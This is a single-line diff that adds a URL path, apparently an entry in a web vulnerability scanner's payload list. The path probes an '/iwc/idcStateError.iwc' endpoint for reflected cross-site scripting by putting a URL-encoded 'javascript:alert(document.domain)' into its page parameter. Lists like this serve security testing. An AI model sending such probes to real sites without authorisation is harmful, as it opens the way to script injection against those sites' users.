@@ -1,0 +1,1 @@
+/iwc/idcStateError.iwc?page=javascript%3aalert(document.domain)%2f%2f
